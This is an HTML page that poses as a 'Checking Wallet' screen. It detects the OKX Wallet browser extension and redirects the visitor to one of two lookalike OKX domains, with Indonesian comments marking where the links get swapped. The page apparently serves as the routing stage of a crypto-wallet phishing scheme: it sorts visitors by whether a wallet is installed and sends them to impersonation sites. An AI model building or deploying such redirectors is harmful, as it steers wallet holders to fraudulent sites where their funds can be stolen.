<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Checking Wallet...</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f2f2f2;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .spinner {
      border: 6px solid #e0e0e0;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin-bottom: 16px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .message {
      font-size: 18px;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <div class="message">Checking for OKX Wallet extension...</div>

  <script>
    function detectOKXWallet(timeout = 3000) {
      return new Promise((resolve) => {
        const checkWallet = () => {
          if (typeof window.okxwallet !== 'undefined') {
            resolve(true);
          } else {
            resolve(false);
          }
        };

        // Wait up to 1 second after window load
        window.addEventListener('load', () => {
          setTimeout(checkWallet, 1000);
        });

        // Safety fallback in case window.load never fires
        setTimeout(() => {
          if (typeof window.okxwallet !== 'undefined') {
            resolve(true);
          } else {
            resolve(false);
          }
        }, timeout);
      });
    }

    function fallbackMessage() {
      const msg = document.querySelector('.message');
      msg.textContent = 'Could not detect OKX Wallet. Please check your extension or try again.';
    }

    detectOKXWallet().then((hasOKX) => {
      if (hasOKX) {
        window.location.href = "https://okxwallet.vercel.app"; // Ganti dengan link B
      } else {
        window.location.href = "https://okx-wallet.online"; // Ganti dengan link A
      }
    }).catch(() => {
      fallbackMessage();
    });

    // Optional: Safety fallback in case user never gets redirected
    setTimeout(() => {
      const stillHere = !window.location.href.includes("link-a.com") && !window.location.href.includes("link-b.com");
      if (stillHere) fallbackMessage();
    }, 5000); // after 5 seconds
  </script>
</body>
</html>
